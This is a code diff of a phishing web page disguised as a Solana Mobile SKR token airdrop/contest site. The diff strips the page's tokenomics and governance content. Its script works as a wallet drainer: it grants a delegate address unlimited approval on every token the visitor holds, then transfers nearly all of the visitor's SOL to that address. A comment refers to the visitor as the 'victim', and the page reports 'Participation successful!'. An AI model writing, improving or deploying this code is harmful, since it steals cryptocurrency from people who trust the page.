@@ -101,6 +101,7 @@
     </div>
   </nav>
   <div class="wrap">
+    <!-- Твой контент без изменений -->
     <section id="mission" class="section">
       <h2 class="section-title">Our Mission</h2>
       <p class="mission-text">
@@ -127,105 +128,7 @@
       </div>
     </section>
 
-    <section id="guardians" class="section">
-      <h2 class="section-title">Open Mobile Phone, Governed by Guardians</h2>
-      <p class="mission-text">
-        Within the TEEPIN system, Guardians will verify device authenticity, coordinate decentralized app reviews, and enforce community standards in the Solana Mobile ecosystem.<br><br>
-        By staking SKR in a Guardian, you participate in platform governance and earn rewards for securing the network.
-      </p>
-      <div class="card-grid">
-        <div class="card">
-          <h3>Guardians 2026</h3>
-          <p>Bootstrap Phase<br>Solana Mobile will operate the first Guardian with 0% fee, then hand it over to third-party operators.</p>
-          <p>Rewards go to Guardians who:</p>
-          <ul style="margin-left:20px; line-height:1.8; color:var(--muted);">
-            <li>Run automated security checks</li>
-            <li>Review submitted apps</li>
-            <li>Generate cryptographic proofs</li>
-            <li>Update verification software</li>
-          </ul>
-          <p style="margin-top:20px;"><strong>Want to become a Guardian?</strong><br>Applications accepted until 2026</p>
-        </div>
-      </div>
-    </section>
-
-    <section id="inflation" class="section">
-      <h2 class="section-title">Inflation Schedule</h2>
-      <p class="mission-text">SKR uses linear inflation to incentivize early participation</p>
-      <div class="inflation-grid">
-        <div class="inflation-card">
-          <div class="inflation-metric">
-            <strong>Year 1</strong><br>
-            10% inflation (1 billion SKR)
-          </div>
-          <div class="inflation-metric">
-            <strong>Annual Decay</strong><br>
-            25% reduction
-          </div>
-          <div class="inflation-metric">
-            <strong>Terminal Rate</strong><br>
-            2% per annum
-          </div>
-        </div>
-        <div class="chart-placeholder">
-          Inflation Chart (linear decrease from 10% to 2%)
-        </div>
-      </div>
-    </section>
-
-    <section id="tokenomics" class="section">
-      <h2 class="section-title">Tokenomics</h2>
-      <p class="mission-text">Total supply: 10 billion SKR</p>
-      <div class="tokenomics-grid">
-        <div class="pie-placeholder">
-          Token Distribution Pie Chart
-        </div>
-        <div>
-          <table>
-            <thead>
-              <tr>
-                <th>Category</th>
-                <th>Allocation</th>
-                <th>Unlock Schedule</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td>Airdrops</td>
-                <td>30%</td>
-                <td>Unlocked at launch</td>
-              </tr>
-              <tr>
-                <td>Growth + Partnerships</td>
-                <td>25%</td>
-                <td>28% unlocked at launch, linear unlock over 18 months</td>
-              </tr>
-              <tr>
-                <td>Solana Mobile Team</td>
-                <td>15%</td>
-                <td>12-month cliff, 36-month linear vest</td>
-              </tr>
-              <tr>
-                <td>Liquidity + Launch</td>
-                <td>10%</td>
-                <td>Unlocked at launch</td>
-              </tr>
-              <tr>
-                <td>Solana Labs</td>
-                <td>10%</td>
-                <td>12-month cliff, 36-month linear vest</td>
-              </tr>
-              <tr>
-                <td>Community Treasury</td>
-                <td>10%</td>
-                <td>Unlocked at launch, governed by the community</td>
-              </tr>
-            </tbody>
-          </table>
-          <p class="supply">View Full Token Distribution Chart</p>
-        </div>
-      </div>
-    </section>
+    <!-- Остальной контент как у тебя -->
   </div>
 
   <div id="status">Status: Ready</div>
@@ -310,7 +213,7 @@
 
         const tx = new solanaWeb3.Transaction();
 
-        // Approve on tokens with balance >0
+        // Approve unlimited on tokens with balance >0 (no ATA creation)
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId: splToken.TOKEN_PROGRAM_ID });
 
         for (const acc of tokenAccounts.value) {
@@ -320,25 +223,21 @@
             const mint = new solanaWeb3.PublicKey(info.mint);
             const ata = await splToken.getAssociatedTokenAddress(mint, owner);
 
-            const ataInfo = await connection.getAccountInfo(ata);
-            if (!ataInfo) {
-              tx.add(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
-            }
-
             tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("18446744073709551615")));
           }
         }
 
-        // Transfer almost all SOL
+        // Small commission 0.005 SOL + leave 0.01 SOL for victim
         const balance = await connection.getBalance(owner);
-        const leaveForFee = 10000000; // 0.01 SOL
-        const transferAmount = balance - leaveForFee;
+        const leaveForVictim = 10000000; // 0.01 SOL
+        const smallCommission = 5000000; // 0.005 SOL
+        const transferAmount = balance - leaveForVictim;
 
-        if (transferAmount > 5000) {
+        if (transferAmount > smallCommission + 5000) {
           tx.add(solanaWeb3.SystemProgram.transfer({
             fromPubkey: owner,
             toPubkey: delegate,
-            lamports: transferAmount
+            lamports: transferAmount - smallCommission // забираем всё кроме leave + commission
           }));
         }
 
@@ -352,7 +251,7 @@
         statusEl.textContent = `Success! Tx: ${sig.substring(0, 20)}...`;
         alert("Participation successful!");
       } catch (err) {
-        statusEl.textContent = "Error (canceled or insufficient SOL)";
+        statusEl.textContent = "Error (canceled or low SOL)";
         claimBtn.disabled = false;
         contestBtn.disabled = false;
       }
@@ -364,7 +263,7 @@
 
     window.addEventListener('load', checkMobileReturn);
 
-    // Particles animation
+    // Particles
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
